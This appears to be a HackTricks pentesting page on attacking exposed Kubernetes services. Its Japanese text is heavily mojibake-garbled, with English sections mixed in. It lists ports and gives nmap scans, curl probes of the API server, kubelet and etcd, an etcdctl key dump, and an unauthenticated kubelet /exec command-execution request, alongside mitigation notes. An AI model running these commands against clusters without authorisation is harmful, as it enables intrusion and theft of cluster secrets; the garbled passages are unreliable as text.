# Kubernetesã‚µãƒ¼ãƒ“ã‚¹ã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* ã‚‚ã— **HackTricksã§ã‚ãªãŸã®ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„**å ´åˆã‚„ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã„**å ´åˆã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ã¨** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

Kubernetesã¯ã„ãã¤ã‹ã®**ç‰¹å®šã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹**ã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€ã“ã‚Œã‚‰ã¯**ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã«å…¬é–‹ã•ã‚Œã¦ã„ã‚‹**ã‹ã€**1ã¤ã®ãƒãƒƒãƒ‰ã‚’ä¾µå®³ã—ãŸå¾Œã®å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯**ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

## OSINTã‚’ä½¿ç”¨ã—ãŸå…¬é–‹ã•ã‚ŒãŸãƒãƒƒãƒ‰ã®æ¤œç´¢

ä¸€ã¤ã®æ–¹æ³•ã¯ã€[crt.sh](https://crt.sh)ã§`Identity LIKE "k8s.%.com"`ã‚’æ¤œç´¢ã—ã¦ã€kubernetesã«é–¢é€£ã™ã‚‹ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã§ã™ã€‚åˆ¥ã®æ–¹æ³•ã¯ã€githubã§`"k8s.%.com"`ã‚’æ¤œç´¢ã—ã€ãã®æ–‡å­—åˆ—ã‚’å«ã‚€**YAMLãƒ•ã‚¡ã‚¤ãƒ«**ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã§ã™ã€‚

## KubernetesãŒã‚µãƒ¼ãƒ“ã‚¹ã‚’å…¬é–‹ã™ã‚‹æ–¹æ³•

ã‚µãƒ¼ãƒ“ã‚¹ã‚’å…¬é–‹ã™ã‚‹ãŸã‚ã«KubernetesãŒã©ã®ã‚ˆã†ã«æ©Ÿèƒ½ã™ã‚‹ã‹ã‚’ç†è§£ã™ã‚‹ã¨å½¹ç«‹ã¤ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“:

{% content-ref url="exposing-services-in-kubernetes.md" %}
[exposing-services-in-kubernetes.md](exposing-services-in-kubernetes.md)
{% endcontent-ref %}

## ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³ã«ã‚ˆã‚‹å…¬é–‹ã•ã‚ŒãŸãƒãƒƒãƒ‰ã®æ¤œç´¢

Kubernetesã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã§ã¯ã€æ¬¡ã®ãƒãƒ¼ãƒˆãŒé–‹ã„ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™:

| ãƒãƒ¼ãƒˆ           | ãƒ—ãƒ­ã‚»ã‚¹        | èª¬æ˜                                                                   |
| --------------- | -------------- | ---------------------------------------------------------------------- |
| 443/TCP         | kube-apiserver | Kubernetes APIãƒãƒ¼ãƒˆ                                                   |
| 2379/TCP        | etcd           |                                                                        |
| 6666/TCP        | etcd           | etcd                                                                   |
| 4194/TCP        | cAdvisor       | ã‚³ãƒ³ãƒ†ãƒŠã®ãƒ¡ãƒˆãƒªã‚¯ã‚¹                                                   |
| 6443/TCP        | kube-apiserver | Kubernetes APIãƒãƒ¼ãƒˆ                                                   |
| 8443/TCP        | kube-apiserver | Minikube APIãƒãƒ¼ãƒˆ                                                     |
| 8080/TCP        | kube-apiserver | ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®ãªã„APIãƒãƒ¼ãƒˆ                                             |
| 10250/TCP       | kubelet        | ãƒ•ãƒ«ãƒ¢ãƒ¼ãƒ‰ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹HTTPS API                                   |
| 10255/TCP       | kubelet        | èªè¨¼ã•ã‚Œã¦ã„ãªã„èª­ã¿å–ã‚Šå°‚ç”¨HTTPãƒãƒ¼ãƒˆ: ãƒãƒƒãƒ‰ã€å®Ÿè¡Œä¸­ã®ãƒãƒƒãƒ‰ã€ãƒãƒ¼ãƒ‰ã®çŠ¶æ…‹ |
| 10256/TCP       | kube-proxy     | Kube Proxyãƒ˜ãƒ«ã‚¹ãƒã‚§ãƒƒã‚¯ã‚µãƒ¼ãƒãƒ¼                                        |
| 9099/TCP        | calico-felix   | Calicoã®ãƒ˜ãƒ«ã‚¹ãƒã‚§ãƒƒã‚¯ã‚µãƒ¼ãƒãƒ¼                                          |
| 6782-4/TCP      | weave          | ãƒ¡ãƒˆãƒªã‚¯ã‚¹ã¨ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ                                               |
| 30000-32767/TCP | NodePort       | ã‚µãƒ¼ãƒ“ã‚¹ã¸ã®ãƒ—ãƒ­ã‚­ã‚·                                                    |
| 44134/TCP       | Tiller         | Helmã‚µãƒ¼ãƒ“ã‚¹ã®ãƒªã‚¹ãƒ‹ãƒ³ã‚°                                                |

### Nmap
```
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16
```
### Kube-apiserver

ã“ã‚Œã¯ã€é€šå¸¸ã€ç®¡ç†è€…ãŒãƒ„ãƒ¼ãƒ«**`kubectl`**ã‚’ä½¿ç”¨ã—ã¦è©±ã™**API Kubernetesã‚µãƒ¼ãƒ“ã‚¹**ã§ã™ã€‚

ä¸€èˆ¬çš„ãªãƒãƒ¼ãƒˆã¯6443ã¨443ã§ã™ãŒã€minikubeã§ã¯8443ã€éã‚»ã‚­ãƒ¥ã‚¢ãªå ´åˆã¯8080ã‚‚ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
```
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
```
**æ¬¡ã®ãƒšãƒ¼ã‚¸ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã¨ã®ã‚„ã‚Šå–ã‚Šã§æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—ã—ã€æ©Ÿå¯†ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã‚’å­¦ã³ã¾ã™:**

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

### Kubelet API

ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã¯**ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®å„ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¾ã™**ã€‚ã“ã‚Œã¯**ãƒãƒ¼ãƒ‰**å†…ã®ãƒãƒƒãƒ‰ã‚’**åˆ¶å¾¡**ã™ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã§ã™ã€‚**kube-apiserver**ã¨é€šä¿¡ã—ã¾ã™ã€‚

ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ãŒå…¬é–‹ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**èªè¨¼ã•ã‚Œã¦ã„ãªã„RCE**ã‚’è¦‹ã¤ã‘ãŸå¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

#### Kubelet API
```
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```
ã‚‚ã—ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒ`Unauthorized`ã§ã‚ã‚Œã°ã€èªè¨¼ãŒå¿…è¦ã§ã™ã€‚

ãƒãƒ¼ãƒ‰ã®ä¸€è¦§ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã§kubeletã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®ä¸€è¦§ã‚’å–å¾—ã§ãã¾ã™ã€‚
```bash
kubectl get nodes -o custom-columns='IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS='' read -r node; do
ip=$(echo $node | awk '{print $1}')
port=$(echo $node | awk '{print $2}')
echo "curl -k --max-time 30 https://$ip:$port/pods"
echo "curl -k --max-time 30 https://$ip:2379/version" #Check  also for etcd
done
```
#### kubeletï¼ˆèª­ã¿å–ã‚Šå°‚ç”¨ï¼‰

The kubelet is the primary node agent that runs on each node in a Kubernetes cluster. It is responsible for managing the containers and their lifecycle on the node. As a pentester, you can gain read-only access to the kubelet to gather information about the running containers and their configurations.

To exploit this, you can use the following techniques:

1. **Unauthenticated Access**: In some cases, the kubelet may be exposed without authentication. You can simply access the kubelet's API endpoint and retrieve information about the containers running on the node.

2. **API Server Misconfiguration**: If the kubelet is configured to use the Kubernetes API server for authentication and authorization, you can try to exploit misconfigurations in the API server to gain unauthorized access to the kubelet.

3. **Insecure Defaults**: The kubelet may have insecure defaults that allow unauthorized access. For example, it may have insecure permissions set on its API endpoint or allow unauthenticated requests.

To protect against these attacks, it is important to secure the kubelet by enabling authentication and authorization, configuring secure defaults, and regularly updating Kubernetes to patch any vulnerabilities.
```
curl -k https://<IP Address>:10255
http://<external-IP>:10255/pods
```
### etcd API

The etcd API is a key-value store used by Kubernetes to store cluster configuration data. It is important to understand the security implications of the etcd API and how to properly test it during a penetration test.

#### Default Configuration

By default, the etcd API is not exposed externally and can only be accessed from within the Kubernetes cluster. However, misconfigurations or insecure deployments can lead to the etcd API being exposed to the internet, allowing unauthorized access to sensitive data.

#### Testing for Exposed etcd API

During a penetration test, it is important to check if the etcd API is exposed externally. This can be done by scanning the target network for open ports, specifically port 2379 (the default port for the etcd API). If the port is open and accessible from the internet, further testing should be conducted to identify any potential vulnerabilities.

#### Exploiting Exposed etcd API

If the etcd API is exposed externally, an attacker can potentially exploit it to gain unauthorized access to sensitive data or even take control of the Kubernetes cluster. Common vulnerabilities include weak or default credentials, unauthenticated access, and insecure communication.

To exploit these vulnerabilities, an attacker can use tools like `etcdctl` to interact with the etcd API and perform actions such as reading or modifying key-value pairs. It is important to note that exploiting the etcd API requires a deep understanding of the Kubernetes cluster's configuration and the etcd data model.

#### Mitigation

To mitigate the risk of an exposed etcd API, it is recommended to follow security best practices when deploying Kubernetes clusters. This includes ensuring that the etcd API is not exposed externally, using strong authentication and authorization mechanisms, and encrypting communication between etcd nodes.

Regular security assessments and penetration tests should also be conducted to identify and address any vulnerabilities in the etcd API and the overall Kubernetes cluster.
```
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### Tiller

Tillerã¯ã€Kubernetesã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã§Helmãƒãƒ£ãƒ¼ãƒˆã‚’ç®¡ç†ã™ã‚‹ãŸã‚ã®ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã™ã€‚Tillerã¯ã€Helmã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‹ã‚‰ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å—ã‘å–ã‚Šã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’æ“ä½œã—ã¦ãƒãƒ£ãƒ¼ãƒˆã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã€ã‚¢ãƒƒãƒ—ã‚°ãƒ¬ãƒ¼ãƒ‰ã€å‰Šé™¤ãªã©ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

Tillerã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®ã™ã¹ã¦ã®ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹æ¨©é™ã‚’æŒã£ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€æ‚ªæ„ã®ã‚ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒTillerã‚’æ‚ªç”¨ã—ã¦ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’æ”»æ’ƒã™ã‚‹å¯èƒ½æ€§ã‚’é«˜ã‚ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

Tillerã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å‘ä¸Šã•ã›ã‚‹ãŸã‚ã«ã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒæ¨å¥¨ã•ã‚Œã¾ã™ã€‚

1. Tillerã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’åˆ¶é™ã™ã‚‹: Tillerã«ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®ã™ã¹ã¦ã®ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹æ¨©é™ãŒãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ä¸ãˆã‚‰ã‚Œã¦ã„ã¾ã™ãŒã€å¿…è¦ãªæ¨©é™ã®ã¿ã‚’æŒã¤ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã—ã€Tillerã«å‰²ã‚Šå½“ã¦ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

2. Tillerã®RBACã‚’è¨­å®šã™ã‚‹: Role-Based Access Controlï¼ˆRBACï¼‰ã‚’ä½¿ç”¨ã—ã¦ã€Tillerã«ä¸ãˆã‚‰ã‚Œã‚‹æ¨©é™ã‚’åˆ¶é™ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚å¿…è¦ãªæ¨©é™ã®ã¿ã‚’æŒã¤ãƒ­ãƒ¼ãƒ«ã¨ãƒ­ãƒ¼ãƒ«ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°ã‚’ä½œæˆã—ã€Tillerã«å‰²ã‚Šå½“ã¦ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

3. Tillerã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ã‚¯ã‚»ã‚¹ã‚’åˆ¶é™ã™ã‚‹: Tillerã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®ã™ã¹ã¦ã®ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ãŒã€å¿…è¦ãªå ´åˆã«ã®ã¿ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒãƒªã‚·ãƒ¼ã‚’è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

4. Tillerã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’æœ€æ–°ã«ä¿ã¤: Tillerã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ãƒƒãƒ—ã‚°ãƒ¬ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã§ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è„†å¼±æ€§ãŒä¿®æ­£ã•ã‚Œã€ã‚ˆã‚Šå®‰å…¨ãªçŠ¶æ…‹ã«ãªã‚Šã¾ã™ã€‚

ã“ã‚Œã‚‰ã®æ‰‹é †ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã€Tillerã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å‘ä¸Šã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
helm --host tiller-deploy.kube-system:44134 version
```
ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ã€Kuberneteså†…ã§ç‰¹æ¨©ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

### cAdvisor

ãƒ¡ãƒˆãƒªã‚¯ã‚¹ã‚’åé›†ã™ã‚‹ãŸã‚ã«å½¹ç«‹ã¤ã‚µãƒ¼ãƒ“ã‚¹ã§ã™ã€‚
```
curl -k https://<IP Address>:4194
```
### NodePort

ãƒãƒ¼ãƒ‰ãƒãƒ¼ãƒˆã‚’ä»‹ã—ã¦ãƒãƒ¼ãƒˆãŒå…¬é–‹ã•ã‚Œã‚‹ã¨ã€åŒã˜ãƒãƒ¼ãƒˆãŒã™ã¹ã¦ã®ãƒãƒ¼ãƒ‰ã§é–‹ã‹ã‚Œã€ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ãŒå®£è¨€ã•ã‚ŒãŸã‚µãƒ¼ãƒ“ã‚¹ã«ãƒ—ãƒ­ã‚­ã‚·ã•ã‚Œã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ã“ã®ãƒãƒ¼ãƒˆã¯**30000-32767ã®ç¯„å›²**ã«ã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€æ–°ã—ã„æœªãƒã‚§ãƒƒã‚¯ã®ã‚µãƒ¼ãƒ“ã‚¹ã¯ã“ã‚Œã‚‰ã®ãƒãƒ¼ãƒˆã‚’ä»‹ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã«ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```
sudo nmap -sS -p 30000-32767 <IP>
```
## è„†å¼±ãªè¨­å®šãƒŸã‚¹

### Kube-apiserverã®åŒ¿åã‚¢ã‚¯ã‚»ã‚¹

**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯**ã€**kube-apiserver**ã®APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯**åŒ¿å**ã‚¢ã‚¯ã‚»ã‚¹ãŒ**ç¦æ­¢**ã•ã‚Œã¦ã„ã¾ã™ã€‚ã—ã‹ã—ã€**æ©Ÿå¯†æƒ…å ±ã‚’å…¬é–‹ã™ã‚‹è„†å¼±ãªã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ**ãŒå­˜åœ¨ã—ãªã„ã‹ç¢ºèªã™ã‚‹ã“ã¨ã¯å¸¸ã«è‰¯ã„ã‚¢ã‚¤ãƒ‡ã‚¢ã§ã™ã€‚

![](https://www.cyberark.com/wp-content/uploads/2019/09/Kube-Pen-2-fig-5.png)

### ETCDã®åŒ¿åã‚¢ã‚¯ã‚»ã‚¹ã®ãƒã‚§ãƒƒã‚¯

ETCDã¯ã‚¯ãƒ©ã‚¹ã‚¿ã®ç§˜å¯†ã€è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ãªã©ã®**æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿**ã‚’ä¿å­˜ã—ã¦ã„ã¾ã™ã€‚**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯**ã€ETCDã¯**åŒ¿å**ã§ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã›ã‚“ãŒã€å¸¸ã«ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã“ã¨ãŒè‰¯ã„ã§ã—ã‚‡ã†ã€‚

ETCDã«åŒ¿åã§ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã€[etcdctl](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md)ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ã‚­ãƒ¼ã‚’å–å¾—ã§ãã¾ã™ï¼š
```
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### **Kubelet RCE**

[Kubeletã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)ã«ã‚ˆã‚Œã°ã€**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã‚µãƒ¼ãƒ“ã‚¹ã¸ã®åŒ¿åã‚¢ã‚¯ã‚»ã‚¹ãŒè¨±å¯ã•ã‚Œã¦ã„ã¾ã™**ï¼š

> Kubeletã‚µãƒ¼ãƒãƒ¼ã¸ã®åŒ¿åãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æœ‰åŠ¹ã«ã—ã¾ã™ã€‚ä»–ã®èªè¨¼æ–¹æ³•ã«ã‚ˆã£ã¦æ‹’å¦ã•ã‚Œãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¯åŒ¿åãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨ã—ã¦æ‰±ã‚ã‚Œã¾ã™ã€‚åŒ¿åãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¯ `system:anonymous` ã§ã€ã‚°ãƒ«ãƒ¼ãƒ—åã¯ `system:unauthenticated` ã§ã™ã€‚

**Kubelet APIã®èªè¨¼ã¨èªå¯ã®ä»•çµ„ã¿**ã‚’ã‚ˆã‚Šç†è§£ã™ã‚‹ãŸã‚ã«ã€ã“ã®ãƒšãƒ¼ã‚¸ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

**Kubelet**ã‚µãƒ¼ãƒ“ã‚¹ã®**APIã¯ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆåŒ–ã•ã‚Œã¦ã„ã¾ã›ã‚“**ãŒã€ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã¯ã“ã“ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚å…¬é–‹ã•ã‚ŒãŸã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã®ã¯ç°¡å˜ã§ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ãã ã•ã„ï¼š
```bash
curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'

Path("/pods").
Path("/run")
Path("/exec")
Path("/attach")
Path("/portForward")
Path("/containerLogs")
Path("/runningpods/").
```
#### /pods

ã“ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯ã€ãƒãƒƒãƒ‰ã¨ãã®ã‚³ãƒ³ãƒ†ãƒŠã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ï¼š
```bash
curl -ks https://worker:10250/pods
```
#### /exec

ã“ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯ã€ã©ã®ã‚³ãƒ³ãƒ†ãƒŠã§ã‚‚ç°¡å˜ã«ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
# Tthe command is passed as an array (split by spaces) and that is a GET request.
curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} \
-d 'input=1' -d 'output=1' -d 'tty=1'                             \
-d 'command=ls' -d 'command=/'
```
è‡ªå‹•åŒ–ã•ã‚ŒãŸæ”»æ’ƒã‚’è¡Œã†ãŸã‚ã«ã€[**kubelet-anon-rce**](https://github.com/serain/kubelet-anon-rce)ã¨ã„ã†ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

{% hint style="info" %}
ã“ã®æ”»æ’ƒã‚’å›é¿ã™ã‚‹ãŸã‚ã«ã¯ã€_**kubelet**_ ã‚µãƒ¼ãƒ“ã‚¹ã‚’ `--anonymous-auth false` ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§å®Ÿè¡Œã—ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚’ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ¬ãƒ™ãƒ«ã§åˆ†é›¢ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

### **Kubelet (èª­ã¿å–ã‚Šå°‚ç”¨ãƒãƒ¼ãƒˆ) ã®æƒ…å ±æ¼æ´©ã®ãƒã‚§ãƒƒã‚¯**

**kubeletã®èª­ã¿å–ã‚Šå°‚ç”¨ãƒãƒ¼ãƒˆ**ãŒå…¬é–‹ã•ã‚Œã¦ã„ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯APIã‹ã‚‰æƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**ãƒãƒƒãƒ‰ã®åå‰ã€å†…éƒ¨ãƒ•ã‚¡ã‚¤ãƒ«ã®å ´æ‰€ã€ãã®ä»–ã®è¨­å®š**ãªã©ã€ã‚¯ãƒ©ã‚¹ã‚¿ã®æ§‹æˆè¦ç´ ãŒå…¬é–‹ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯é‡è¦ãªæƒ…å ±ã§ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã«å…¬é–‹ã•ã‚Œã‚‹ã¹ãã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚

ãŸã¨ãˆã°ã€ãƒªãƒ¢ãƒ¼ãƒˆæ”»æ’ƒè€…ã¯æ¬¡ã®URLã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ã“ã‚Œã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š`http://<external-IP>:10255/pods`

![](https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png)

## å‚è€ƒæ–‡çŒ®

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2" %}

{% embed url="https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet" %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

